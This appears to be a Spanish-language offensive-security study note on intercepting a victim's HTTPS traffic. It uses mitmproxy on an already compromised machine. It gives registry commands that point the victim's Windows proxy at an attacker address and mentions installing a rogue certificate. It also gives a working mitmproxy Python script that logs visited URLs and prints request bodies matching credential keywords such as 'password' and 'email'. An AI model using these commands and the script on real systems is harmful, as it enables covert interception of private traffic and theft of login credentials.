-----
- Tags: #teoria #practica #ataques 
----
# HTTPS Sniffing - SSL/TLS Stripping

El *HTTPS Sniffing*, también conocido como *SSL/TLS Stripping*, es una técnica utilizada por atacantes para interceptar el tráfico cifrado HTTPS entre un usuario y un servidor. Aunque el protocolo HTTPS está diseñado para proporcionar una capa de seguridad adicional mediante la encriptación de la comunicación entre el navegador y el servidor, el HTTPS Sniffing intenta debilitar esta seguridad.

----
# Ataque

El desafío con el tráfico HTTPS, que está *cifrado* para proteger la privacidad y seguridad de los datos ,qes que no se puede leer directamente. Aquí es donde entra en juego la instalación de un certificado en la máquina víctima. Al hacer esto, engañamos al dispositivo para que confíe en un determinado destino (Un *proxy* nuestro), lo que nos permitirá descifrar y acceder al contenido del tráfico HTTPS. De más está decir que para esto necesitaríamos tener acceso a la máquina víctima, sea por una previa explotación para espíar el tráfico posteriormente. 

Con herramientas como **mitmdump** podremos llevar a cabo este ataque, dado que es una herrmienta que actúa como un proxy, permitiéndonos interceptar, modificar y analizar el tráfico entre un cliente y un servidor. 

Una vez instalado **mitmdump**, tendremos tres binarios: 

- mitmdump
- mitmproxy
- mitmweb

En este caso, dejaremos corriendo el **mitmweb**, el cual nos habilitara el servidor proxy por el puerto *8080*, posteriormente deberemos configurar el proxy en la máquina víctima, en caso de ser una máquina Windows, podríamos hacerlo desde una terminal como el usuario administrador con las siguientes líneas: 

```powershell
# Enable Proxy True
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f
# Configurate your proxy server
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d "192.168.1.41:8080" /f
```

Con el binario **mitmproxy**, se nos desplegará una interfaz grafica en donde podremos ver todas las peticiones y desplegar la información de las mismas que realize la máquina vícitma, pero deberíamos proceder a *configurar el certificado*, de lo contrario todas las búsquedas web que realize el usuario se verán con una alerta de seguridad.

Otra opción es crear *scripts propios* y hacer uso de **mitmdump** para vincularlos:

Script propio en Python:
```python
#!/usr/bin/env python3 
from mitmproxy import http
from urllib.parse import urlparse

urls_visiteds = set()
sensible_words = ["login", "user", "pass", "username", "password", "admin", "name", "uname", "pwd", "email", "mail", "correo", "urname"]

def is_sensible(data):
    return any(word in data for word in sensible_words)


def request(packet):
    url = packet.request.url
    url = urlparse(url)
    protocol = url.scheme
    domain = url.netloc
    path = url.path
    data = packet.request.get_text()


    url_to_show = f"{protocol}://{domain}{path}"

    if url_to_show not in urls_visiteds:
        urls_visiteds.add(url_to_show)
        print(f"\n[+] URL Visited: {url_to_show}\n")

    if is_sensible(data):
        print("\n\n\t[!] Possible sensible data:\n")
        print(data)
```

Para vincular este scrip, deberíamos ejecutar el comando:

```bash
./mitmdump -s script.py --quiet
```